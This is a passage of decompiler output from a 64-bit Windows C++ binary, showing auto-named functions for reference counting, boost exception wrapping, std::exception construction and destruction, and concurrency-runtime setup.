    if ( !_InterlockedDecrement(v7 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 16i64))(v7);
  }
  return result;
}

//----- (0000000140010A00) ----------------------------------------------------
__int64 __fastcall sub_140010A00(__int64 *a1, __int64 a2)
{
  __int64 *v2; // rsi
  __int64 *v3; // rax
  volatile signed __int32 *v4; // rbx
  __int64 v5; // rcx
  __int64 v6; // ST28_8
  volatile signed __int32 *v7; // rbx
  __int64 result; // rax
  __int64 v9; // [rsp+28h] [rbp-20h]
  __int64 v10; // [rsp+30h] [rbp-18h]
  volatile signed __int32 *v11; // [rsp+50h] [rbp+8h]

  v2 = a1;
  v9 = a2;
  v3 = sub_14000F840(&v11, a2);
  v10 = *v3;
  *v3 = 0i64;
  v4 = v11;
  if ( v11 )
  {
    if ( !_InterlockedDecrement(v11 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 8i64))(v4);
      if ( !_InterlockedDecrement(v4 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v4 + 16i64))(v4);
    }
  }
  sub_140008430();
  v5 = v9;
  v6 = *v2;
  *v2 = v5;
  v7 = (volatile signed __int32 *)v2[1];
  result = v10;
  v2[1] = v10;
  if ( v7 && !_InterlockedDecrement(v7 + 2) )
  {
    result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 8i64))(v7);
    if ( !_InterlockedDecrement(v7 + 3) )
      result = (*(__int64 (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v7 + 16i64))(v7);
  }
  return result;
}

//----- (0000000140010AE0) ----------------------------------------------------
void __fastcall sub_140010AE0(__int64 a1, __int64 a2, __int64 *a3)
{
  __int64 *v3; // rbx
  __int64 *v4; // rax
  __int64 v5; // r10
  volatile signed __int32 *v6; // rbx
  volatile signed __int32 *v7; // [rsp+40h] [rbp+18h]

  v3 = a3;
  v4 = sub_14000F7D0(&v7, a2);
  v5 = *v3;
  *v3 = *v4;
  *v4 = v5;
  v6 = v7;
  if ( v7 )
  {
    if ( !_InterlockedDecrement(v7 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 8i64))(v6);
      if ( !_InterlockedDecrement(v6 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 16i64))(v6);
    }
  }
  sub_140008430();
}

//----- (0000000140010B60) ----------------------------------------------------
void __fastcall __noreturn sub_140010B60(const struct std::exception *a1)
{
  std::exception *v1; // rax
  char v2; // [rsp+30h] [rbp-108h]
  char v3; // [rsp+C0h] [rbp-78h]

  v1 = sub_140016D50((std::exception *)&v3, a1);
  sub_14000FEB0(&v2, v1);
  CxxThrowException(
    &v2,
    &_TI9_AV__clone_impl_U__error_info_injector_Vthread_resource_error_boost___exception_detail_boost___exception_detail_boost__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D3240: using guessed type int _TI9_AV__clone_impl_U__error_info_injector_Vthread_resource_error_boost___exception_detail_boost___exception_detail_boost__;

//----- (0000000140010BA0) ----------------------------------------------------
_QWORD *__fastcall sub_140010BA0(_QWORD *a1, const struct std::exception *a2, __int64 a3, int a4)
{
  const struct std::exception *v4; // rsi
  _QWORD *v5; // rbx
  __int64 v6; // rdi
  __int64 v7; // rcx

  v4 = a2;
  v5 = a1;
  v6 = 0i64;
  if ( a4 )
  {
    a1[14] = &unk_1400A3D58;
    a1[16] = &off_1400A3CB8;
  }
  sub_140010ED0((std::exception *)a1, a2);
  *v5 = &off_1400A3D28;
  v5[9] = off_1400A3D38;
  *(_QWORD *)((char *)v5 + *(signed int *)(v5[14] + 4i64) + 112) = &off_1400A3D40;
  v7 = *(signed int *)(v5[14] + 4i64);
  *(_DWORD *)((char *)v5 + v7 + 108) = v7 - 16;
  if ( v4 )
    v6 = (__int64)v4 + 72;
  sub_140013340((__int64)(v5 + 9), v6);
  return v5;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A3D28: using guessed type __int64 (__fastcall *off_1400A3D28)(void *);
// 1400A3D38: using guessed type __int64 (__fastcall *off_1400A3D38[2])();
// 1400A3D40: using guessed type __int64 (__fastcall *off_1400A3D40)();

//----- (0000000140010C60) ----------------------------------------------------
_QWORD *__fastcall sub_140010C60(_QWORD *a1, const struct std::exception *a2, int a3)
{
  const struct std::exception *v3; // rsi
  _QWORD *v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rcx

  v3 = a2;
  v4 = a1;
  v5 = 0i64;
  if ( a3 )
  {
    a1[14] = &unk_1400A3D58;
    a1[16] = &off_1400A3CB8;
  }
  sub_140010ED0((std::exception *)a1, a2);
  *v4 = &off_1400A3D28;
  v4[9] = off_1400A3D38;
  *(_QWORD *)((char *)v4 + *(signed int *)(v4[14] + 4i64) + 112) = &off_1400A3D40;
  v6 = *(signed int *)(v4[14] + 4i64);
  *(_DWORD *)((char *)v4 + v6 + 108) = v6 - 16;
  if ( v3 )
    v5 = (__int64)v3 + 72;
  sub_140013340((__int64)(v4 + 9), v5);
  return v4;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A3D28: using guessed type __int64 (__fastcall *off_1400A3D28)(void *);
// 1400A3D38: using guessed type __int64 (__fastcall *off_1400A3D38[2])();
// 1400A3D40: using guessed type __int64 (__fastcall *off_1400A3D40)();

//----- (0000000140010D20) ----------------------------------------------------
_QWORD *__fastcall sub_140010D20(_QWORD *a1, const struct std::exception *a2, int a3)
{
  _QWORD *v3; // rbx

  v3 = a1;
  if ( a3 )
  {
    a1[14] = &unk_1400A3D58;
    a1[16] = &off_1400A3CB8;
  }
  sub_140010ED0((std::exception *)a1, a2);
  *v3 = &off_1400A3D28;
  v3[9] = off_1400A3D38;
  *(_QWORD *)((char *)v3 + *(signed int *)(v3[14] + 4i64) + 112) = &off_1400A3D40;
  *(_DWORD *)((char *)v3 + *(signed int *)(v3[14] + 4i64) + 108) = 0;
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A3D28: using guessed type __int64 (__fastcall *off_1400A3D28)(void *);
// 1400A3D38: using guessed type __int64 (__fastcall *off_1400A3D38[2])();
// 1400A3D40: using guessed type __int64 (__fastcall *off_1400A3D40)();

//----- (0000000140010DB0) ----------------------------------------------------
_QWORD *__fastcall sub_140010DB0(_QWORD *a1, __int64 a2, int a3)
{
  _QWORD *v3; // rbx

  v3 = a1;
  if ( a3 )
  {
    a1[8] = &unk_1400A3D90;
    a1[10] = &off_1400A3CB8;
  }
  sub_1400111E0(a1, a2);
  *v3 = &off_1400A3D60;
  v3[5] = &off_1400A3D68;
  *(_QWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 64) = &off_1400A3D78;
  *(_DWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 60) = 0;
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A3D60: using guessed type __int64 (__fastcall *off_1400A3D60)(void *);
// 1400A3D68: using guessed type __int64 (__fastcall *off_1400A3D68)();
// 1400A3D78: using guessed type __int64 (__fastcall *off_1400A3D78)();

//----- (0000000140010E40) ----------------------------------------------------
_QWORD *__fastcall sub_140010E40(_QWORD *a1, __int64 a2, int a3)
{
  _QWORD *v3; // rbx

  v3 = a1;
  if ( a3 )
  {
    a1[8] = &unk_1400A3EA0;
    a1[10] = &off_1400A3CB8;
  }
  sub_140011270(a1);
  *v3 = &off_1400A3E70;
  v3[5] = &off_1400A3E78;
  *(_QWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 64) = &off_1400A3E88;
  *(_DWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 60) = 0;
  return v3;
}
// 140011270: using guessed type __int64 __cdecl sub_140011270(_QWORD);
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A3E70: using guessed type __int64 (__fastcall *off_1400A3E70)(void *);
// 1400A3E78: using guessed type __int64 (__fastcall *off_1400A3E78)();
// 1400A3E88: using guessed type __int64 (__fastcall *off_1400A3E88)();

//----- (0000000140010ED0) ----------------------------------------------------
std::exception *__fastcall sub_140010ED0(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rdi
  std::exception *v3; // rbx
  __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  sub_140011370(a1, a2);
  *(_QWORD *)v3 = &loc_1400A3CD0;
  if ( v2 )
    v2 = (const struct std::exception *)((char *)v2 + 72);
  *((_QWORD *)v3 + 9) = &off_1400A3CB0;
  v4 = *((_QWORD *)v2 + 1);
  *((_QWORD *)v3 + 10) = v4;
  if ( v4 )
    (*(void (__cdecl **)(__int64))(*(_QWORD *)v4 + 24i64))(v4);
  *((_QWORD *)v3 + 11) = *((_QWORD *)v2 + 2);
  *((_QWORD *)v3 + 12) = *((_QWORD *)v2 + 3);
  *((_DWORD *)v3 + 26) = *((_DWORD *)v2 + 8);
  *(_QWORD *)v3 = &off_1400A3D18;
  *((_QWORD *)v3 + 9) = &off_1400A4FE0;
  return v3;
}
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3D18: using guessed type __int64 (__fastcall *off_1400A3D18)(void *);
// 1400A4FE0: using guessed type __int64 (__fastcall *off_1400A4FE0)();

//----- (0000000140010F60) ----------------------------------------------------
__int64 *__fastcall sub_140010F60(__int64 *a1, _QWORD *a2, _QWORD *a3, _QWORD *a4, __int64 *a5, __int64 *a6)
{
  _QWORD *v6; // r15
  _QWORD *v7; // r14
  _QWORD *v8; // rsi
  __int64 *v9; // rdi
  _QWORD *v10; // rax
  _QWORD *v11; // rax
  char v12; // bl
  signed __int64 v13; // rcx
  signed __int64 v14; // rcx
  __int64 v15; // rax
  void *v16; // rax
  __int64 v17; // rax
  __int64 v18; // rax
  __int64 v19; // rax
  void *v21; // [rsp+40h] [rbp-59h]
  __int64 v22; // [rsp+50h] [rbp-49h]
  unsigned __int64 v23; // [rsp+58h] [rbp-41h]
  void *v24; // [rsp+60h] [rbp-39h]
  __int64 v25; // [rsp+70h] [rbp-29h]
  unsigned __int64 v26; // [rsp+78h] [rbp-21h]
  void *Src; // [rsp+80h] [rbp-19h]
  __int64 v28; // [rsp+90h] [rbp-9h]
  unsigned __int64 v29; // [rsp+98h] [rbp-1h]

  v6 = a4;
  v7 = a3;
  v8 = a2;
  v9 = a1;
  a1[3] = 15i64;
  a1[2] = 0i64;
  *(_BYTE *)a1 = 0;
  sub_140004DF0(a1, a2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v10 = sub_140009FC0(&Src);
  if ( (unsigned int)sub_14000B9E0(v8, v10) )
  {
    v11 = sub_140009FC0(&v21);
    v12 = 2;
  }
  else
  {
    v11 = sub_1400043C0(&v24);
    v12 = 1;
  }
  sub_140003CB0(v9 + 4, v11);
  if ( v12 & 2 )
  {
    v12 &= 0xFDu;
    if ( v23 >= 0x10 )
      operator delete(v21);
    v23 = 15i64;
    v22 = 0i64;
    LOBYTE(v21) = 0;
  }
  if ( v12 & 1 )
  {
    if ( v26 >= 0x10 )
      operator delete(v24);
    v26 = 15i64;
    v25 = 0i64;
    LOBYTE(v24) = 0;
  }
  if ( v29 >= 0x10 )
    operator delete(Src);
  v29 = 15i64;
  v28 = 0i64;
  LOBYTE(Src) = 0;
  v13 = (signed __int64)(v9 + 8);
  *(_QWORD *)(v13 + 24) = 7i64;
  *(_QWORD *)(v13 + 16) = 0i64;
  *(_WORD *)v13 = 0;
  sub_140005050(v9 + 8, v7, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v14 = (signed __int64)(v9 + 12);
  *(_QWORD *)(v14 + 24) = 7i64;
  *(_QWORD *)(v14 + 16) = 0i64;
  *(_WORD *)v14 = 0;
  sub_140005050(v9 + 12, v6, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v9[16] = *a5;
  v15 = a5[1];
  v9[17] = v15;
  if ( v15 )
    _InterlockedIncrement((volatile signed __int32 *)(v15 + 8));
  v16 = operator new(0xA0ui64);
  if ( v16 )
    v17 = Concurrency::target_block<Concurrency::multi_link_registry<Concurrency::ISource<unsigned __int64>>,Concurrency::ordered_message_processor<unsigned __int64>>::target_block<Concurrency::multi_link_registry<Concurrency::ISource<unsigned __int64>>,Concurrency::ordered_message_processor<unsigned __int64>>(
            v16,
            v8);
  else
    v17 = 0i64;
  v9[18] = v17;
  v9[19] = 0i64;
  sub_140010AE0((__int64)(v9 + 18), v17, v9 + 19);
  v9[20] = 0i64;
  v9[21] = 0i64;
  sub_140012FA0();
  v9[20] = v18;
  v9[22] = 0i64;
  v9[23] = 0i64;
  v9[24] = 0i64;
  v9[25] = 0i64;
  v9[26] = *a6;
  v19 = a6[1];
  v9[27] = v19;
  if ( v19 )
    _InterlockedIncrement((volatile signed __int32 *)(v19 + 8));
  return v9;
}
// 14001FC90: using guessed type __int64 __fastcall Concurrency::target_block<Concurrency::multi_link_registry<Concurrency::ISource<unsigned __int64>>,Concurrency::ordered_message_processor<unsigned __int64>>::target_block<Concurrency::multi_link_registry<Concurrency::ISource<unsigned __int64>>,Concurrency::ordered_message_processor<unsigned __int64>>(_QWORD, _QWORD);

//----- (00000001400111B0) ----------------------------------------------------
std::exception *__fastcall sub_1400111B0(std::exception *a1, const struct std::exception *a2)
{
  std::exception *v2; // rbx

  v2 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v2 = &loc_1400A3C88;
  return v2;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);

//----- (00000001400111E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400111E0(_QWORD *a1, __int64 a2)
{
  __int64 v2; // rbx
  _QWORD *v3; // rdi
  __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  *a1 = &off_1400A3CB0;
  v4 = *(_QWORD *)(a2 + 8);
  v3[1] = v4;
  if ( v4 )
    (*(void (__cdecl **)(__int64))(*(_QWORD *)v4 + 24i64))(v4);
  v3[2] = *(_QWORD *)(v2 + 16);
  v3[3] = *(_QWORD *)(v2 + 24);
  *((_DWORD *)v3 + 8) = *(_DWORD *)(v2 + 32);
  std::exception::exception((std::exception *)(v3 + 5), (const struct std::exception *)(v2 + 40));
  *v3 = &off_1400A3D00;
  v3[5] = &off_1400A3D08;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3D00: using guessed type __int64 (__fastcall *off_1400A3D00)(void *);
// 1400A3D08: using guessed type __int64 (__fastcall *off_1400A3D08)();

//----- (0000000140011300) ----------------------------------------------------
_QWORD *__fastcall sub_140011300(_QWORD *a1)
{
  *a1 = &off_1400A3CB8;
  return a1;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (0000000140011310) ----------------------------------------------------
_QWORD *__fastcall sub_140011310(_QWORD *a1, __int64 a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rdi
  __int64 v4; // rcx

  v2 = a1;
  v3 = a2;
  *a1 = &off_1400A3CB0;
  v4 = *(_QWORD *)(a2 + 8);
  v2[1] = v4;
  if ( v4 )
    (*(void (**)(void))(*(_QWORD *)v4 + 24i64))();
  v2[2] = *(_QWORD *)(v3 + 16);
  v2[3] = *(_QWORD *)(v3 + 24);
  *((_DWORD *)v2 + 8) = *(_DWORD *)(v3 + 32);
  return v2;
}
// 1400A3CB0: using guessed type void *off_1400A3CB0;

//----- (0000000140011370) ----------------------------------------------------
std::exception *__fastcall sub_140011370(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &loc_1400A3CD0;
  *(_OWORD *)((char *)v3 + 24) = *(_OWORD *)((char *)v2 + 24);
  v4 = (signed __int64)v3 + 40;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 40, (_QWORD *)v2 + 5, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);

//----- (00000001400113E0) ----------------------------------------------------
std::exception *__fastcall sub_1400113E0(std::exception *a1, const struct std::exception *a2)
{
  std::exception *v2; // rbx

  v2 = a1;
  sub_140011370(a1, a2);
  *(_QWORD *)v2 = &loc_1400A3CD0;
  return v2;
}

//----- (0000000140011410) ----------------------------------------------------
void **__fastcall sub_140011410(_QWORD *a1)
{
  _QWORD *v1; // rbx
  std::exception *v2; // rcx
  __int64 v3; // rdx
  void **result; // rax
  __int64 v5; // rcx

  v1 = a1;
  v2 = (std::exception *)(a1 + 5);
  *((_QWORD *)v2 - 5) = &off_1400A3D60;
  *(_QWORD *)v2 = &off_1400A3D68;
  *(_QWORD *)((char *)v1 + *(signed int *)(v1[8] + 4i64) + 64) = &off_1400A3D78;
  v3 = *(signed int *)(v1[8] + 4i64);
  *(_DWORD *)((char *)v1 + v3 + 60) = v3 - 16;
  *v1 = &off_1400A3D00;
  *(_QWORD *)v2 = &loc_1400A3C88;
  std::exception::~exception(v2);
  result = &off_1400A3CB0;
  *v1 = &off_1400A3CB0;
  v5 = v1[1];
  if ( v5 )
  {
    result = (void **)(*(__int64 (**)(void))(*(_QWORD *)v5 + 32i64))();
    if ( (_BYTE)result )
      v1[1] = 0i64;
  }
  return result;
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3D00: using guessed type __int64 (__fastcall *off_1400A3D00)(void *);
// 1400A3D60: using guessed type __int64 (__fastcall *off_1400A3D60)(void *);
// 1400A3D68: using guessed type __int64 (__fastcall *off_1400A3D68)();
// 1400A3D78: using guessed type __int64 (__fastcall *off_1400A3D78)();

//----- (00000001400114A0) ----------------------------------------------------
void **__fastcall sub_1400114A0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  std::exception *v2; // rcx
  __int64 v3; // rdx
  void **result; // rax
  __int64 v5; // rcx

  v1 = a1;
  v2 = (std::exception *)(a1 + 5);
  *((_QWORD *)v2 - 5) = &off_1400A3E70;
  *(_QWORD *)v2 = &off_1400A3E78;
  *(_QWORD *)((char *)v1 + *(signed int *)(v1[8] + 4i64) + 64) = &off_1400A3E88;
  v3 = *(signed int *)(v1[8] + 4i64);
  *(_DWORD *)((char *)v1 + v3 + 60) = v3 - 16;
  *v1 = &off_1400A3D00;
  *(_QWORD *)v2 = &loc_1400A3C88;
  std::exception::~exception(v2);
  result = &off_1400A3CB0;
  *v1 = &off_1400A3CB0;
  v5 = v1[1];
  if ( v5 )
  {
    result = (void **)(*(__int64 (**)(void))(*(_QWORD *)v5 + 32i64))();
    if ( (_BYTE)result )
      v1[1] = 0i64;
  }
  return result;
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3D00: using guessed type __int64 (__fastcall *off_1400A3D00)(void *);
// 1400A3E70: using guessed type __int64 (__fastcall *off_1400A3E70)(void *);
// 1400A3E78: using guessed type __int64 (__fastcall *off_1400A3E78)();
// 1400A3E88: using guessed type __int64 (__fastcall *off_1400A3E88)();

//----- (0000000140011530) ----------------------------------------------------
__int64 __fastcall sub_140011530(_QWORD *a1)
{
  _QWORD *v1; // rbx
  __int64 v2; // rcx

  v1 = a1;
  *a1 = &off_1400A3D18;
  a1[9] = &off_1400A3CB0;
  v2 = a1[10];
  if ( v2 && (*(unsigned __int8 (**)(void))(*(_QWORD *)v2 + 32i64))() )
    v1[10] = 0i64;
  *v1 = &loc_1400A3CD0;
  if ( v1[8] >= 0x10ui64 )
    operator delete((void *)v1[5]);
  v1[8] = 15i64;
  v1[7] = 0i64;
  *((_BYTE *)v1 + 40) = 0;
  return std::exception::~exception((std::exception *)v1);
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3D18: using guessed type __int64 (__fastcall *off_1400A3D18)(void *);

//----- (00000001400115B0) ----------------------------------------------------
void __fastcall sub_1400115B0(__int64 **a1)
{
  void **v1; // rbx
  char v2; // [rsp+30h] [rbp+8h]

  v1 = (void **)a1;
  sub_1400134D0(a1, (__int64 *)&v2, **a1, (__int64)*a1);
  operator delete(*v1);
}

//----- (00000001400115E0) ----------------------------------------------------
void __fastcall sub_1400115E0(__int64 a1)
{
  __int64 v1; // rbx
  volatile signed __int32 *v2; // rdi

  v1 = a1;
  v2 = *(volatile signed __int32 **)(a1 + 40);
  if ( v2 )
  {
    if ( !_InterlockedDecrement(v2 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
      if ( !_InterlockedDecrement(v2 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
    }
  }
  if ( *(_QWORD *)(v1 + 24) >= 0x10ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 24) = 15i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_BYTE *)v1 = 0;
}

//----- (0000000140011660) ----------------------------------------------------
void __fastcall sub_140011660(__int64 a1)
{
  __int64 v1; // rbx
  volatile signed __int32 *v2; // rdi

  v1 = a1;
  v2 = *(volatile signed __int32 **)(a1 + 40);
  if ( v2 )
  {
    if ( !_InterlockedDecrement(v2 + 2) )
    {
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 8i64))(v2);
      if ( !_InterlockedDecrement(v2 + 3) )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v2 + 16i64))(v2);
    }
  }
  if ( *(_QWORD *)(v1 + 24) >= 0x10ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 24) = 15i64;
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_BYTE *)v1 = 0;
}

//----- (00000001400116E0) ----------------------------------------------------
void __fastcall sub_1400116E0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  __int64 v2; // rcx

  v1 = a1;
  v2 = *a1;
  if ( v2 )
  {
    if ( (*(unsigned __int8 (**)(void))(*(_QWORD *)v2 + 32i64))() )
      *v1 = 0i64;
  }
}

//----- (0000000140011710) ----------------------------------------------------
void __fastcall sub_140011710(__int64 a1)
{
  volatile signed __int32 *v1; // rcx
  signed int v2; // eax
  HANDLE v3; // rax

  if ( *(_BYTE *)(a1 + 8) )
  {
    v1 = *(volatile signed __int32 **)a1;
    v2 = _InterlockedExchangeAdd(v1, 0x80000000);
    if ( !_bittest(&v2, 0x1Eu) && v2 > (signed int)2147483648 && !_interlockedbittestandset(v1, 0x1Eu) )
    {
      v3 = sub_1400139E0((__int64)v1);
      SetEvent(v3);
    }
  }
}

//----- (0000000140011940) ----------------------------------------------------
void **__fastcall sub_140011940(_QWORD *a1)
{
  _QWORD *v1; // rbx
  std::exception *v2; // rcx
  void **result; // rax
  __int64 v4; // rcx

  v1 = a1;
  v2 = (std::exception *)(a1 + 5);
  *((_QWORD *)v2 - 5) = &off_1400A3D00;
  *(_QWORD *)v2 = &loc_1400A3C88;
  std::exception::~exception(v2);
  result = &off_1400A3CB0;
  *v1 = &off_1400A3CB0;
  v4 = v1[1];
  if ( v4 )
  {
    result = (void **)(*(__int64 (**)(void))(*(_QWORD *)v4 + 32i64))();
    if ( (_BYTE)result )
      v1[1] = 0i64;
  }
  return result;
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3D00: using guessed type __int64 (__fastcall *off_1400A3D00)(void *);

//----- (00000001400119A0) ----------------------------------------------------
void **__fastcall sub_1400119A0(_QWORD *a1)
{
  void **result; // rax

  result = &off_1400A3CB8;
  *a1 = &off_1400A3CB8;
  return result;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (00000001400119B0) ----------------------------------------------------
void __fastcall sub_1400119B0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  __int64 v2; // rcx

  v1 = a1;
  *a1 = &off_1400A3CB0;
  v2 = a1[1];
  if ( v2 )
  {
    if ( (*(unsigned __int8 (**)(void))(*(_QWORD *)v2 + 32i64))() )
      v1[1] = 0i64;
  }
  JUMPOUT(&loc_140097000);
}
// 1400A3CB0: using guessed type void *off_1400A3CB0;

//----- (0000000140011A00) ----------------------------------------------------
__int64 __fastcall sub_140011A00(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  *(_QWORD *)a1 = &loc_1400A3CD0;
  if ( *(_QWORD *)(a1 + 64) >= 0x10ui64 )
    operator delete(*(void **)(a1 + 40));
  *(_QWORD *)(v1 + 64) = 15i64;
  *(_QWORD *)(v1 + 56) = 0i64;
  *(_BYTE *)(v1 + 40) = 0;
  return std::exception::~exception((std::exception *)v1);
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);

//----- (0000000140011A50) ----------------------------------------------------
_QWORD *__fastcall sub_140011A50(_QWORD *a1, __int64 *a2)
{
  __int64 v2; // rax
  _QWORD *v3; // rbx
  __int64 v4; // rcx
  volatile signed __int32 *v5; // rdi
  __int64 v7; // [rsp+20h] [rbp-18h]

  v2 = a2[1];
  v3 = a1;
  v4 = *a2;
  v7 = *a2;
  if ( v2 )
  {
    _InterlockedIncrement((volatile signed __int32 *)(v2 + 8));
    v4 = v7;
  }
  *v3 = v4;
  v5 = (volatile signed __int32 *)v3[1];
  v3[1] = v2;
  if ( !v5 )
    return v3;
  if ( !_InterlockedDecrement(v5 + 2) )
  {
    (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v5 + 8i64))(v5);
    if ( !_InterlockedDecrement(v5 + 3) )
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v5 + 16i64))(v5);
  }
  return v3;
}

//----- (0000000140011AE0) ----------------------------------------------------
void **__fastcall sub_140011AE0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  __int64 v2; // rdx
  void **result; // rax

  v1 = a1;
  *a1 = &off_1400A3D28;
  a1[9] = off_1400A3D38;
  *(_QWORD *)((char *)a1 + *(signed int *)(a1[14] + 4i64) + 112) = &off_1400A3D40;
  v2 = *(signed int *)(a1[14] + 4i64);
  *(_DWORD *)((char *)a1 + v2 + 108) = v2 - 16;
  sub_140011530(a1);
  result = &off_1400A3CB8;
  v1[16] = &off_1400A3CB8;
  return result;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A3D28: using guessed type __int64 (__fastcall *off_1400A3D28)(void *);
// 1400A3D38: using guessed type __int64 (__fastcall *off_1400A3D38[2])();
// 1400A3D40: using guessed type __int64 (__fastcall *off_1400A3D40)();

//----- (0000000140011B40) ----------------------------------------------------
void **__fastcall sub_140011B40(_QWORD *a1)
{
  _QWORD *v1; // rbx
  void **result; // rax

  v1 = a1;
  sub_140011410(a1);
  result = &off_1400A3CB8;
  v1[10] = &off_1400A3CB8;
  return result;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (0000000140011B60) ----------------------------------------------------
void **__fastcall sub_140011B60(_QWORD *a1)
{
  _QWORD *v1; // rbx
  void **result; // rax

  v1 = a1;
  sub_1400114A0(a1);
  result = &off_1400A3CB8;
  v1[10] = &off_1400A3CB8;
  return result;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (0000000140011B80) ----------------------------------------------------
_QWORD *__fastcall sub_140011B80(__int64 a1, char a2)
{
  return sub_140011BF0((void *)(a1 - *(signed int *)(a1 - 4) - 128), a2);
}

//----- (0000000140011B94) ----------------------------------------------------
_QWORD *__fastcall sub_140011B94(__int64 a1, char a2)
{
  return sub_140011BF0((void *)(a1 - 72), a2);
}

//----- (0000000140011BA0) ----------------------------------------------------
_QWORD *__fastcall sub_140011BA0(__int64 a1, char a2)
{
  return sub_140011C70((void *)(a1 - *(signed int *)(a1 - 4) - 80), a2);
}

//----- (0000000140011BB0) ----------------------------------------------------
_QWORD *__fastcall sub_140011BB0(__int64 a1, char a2)
{
  return sub_140011C70((void *)(a1 - 40), a2);
}

//----- (0000000140011BBC) ----------------------------------------------------
_QWORD *__fastcall sub_140011BBC(__int64 a1, char a2)
{
  return sub_140011CB0((void *)(a1 - *(signed int *)(a1 - 4) - 80), a2);
}

//----- (0000000140011BCC) ----------------------------------------------------
_QWORD *__fastcall sub_140011BCC(__int64 a1, char a2)
{
  return sub_140011CB0((void *)(a1 - 40), a2);
}

//----- (0000000140011BD8) ----------------------------------------------------
void *__fastcall sub_140011BD8(__int64 a1, char a2)
{
  return sub_140011CF0((void *)(a1 - 72), a2);
}

//----- (0000000140011BE4) ----------------------------------------------------
_QWORD *__fastcall sub_140011BE4(__int64 a1, char a2)
{
  return sub_140011D90((void *)(a1 - 40), a2);
}

//----- (0000000140011BF0) ----------------------------------------------------
_QWORD *__fastcall sub_140011BF0(void *a1, char a2)
{
  char v2; // bl
  _QWORD *v3; // rdi
  __int64 v4; // r8

  v2 = a2;
  v3 = a1;
  *(_QWORD *)a1 = &off_1400A3D28;
  *((_QWORD *)a1 + 9) = off_1400A3D38;
  *(_QWORD *)((char *)a1 + *(signed int *)(*((_QWORD *)a1 + 14) + 4i64) + 112) = &off_1400A3D40;
  v4 = *(signed int *)(*((_QWORD *)a1 + 14) + 4i64);
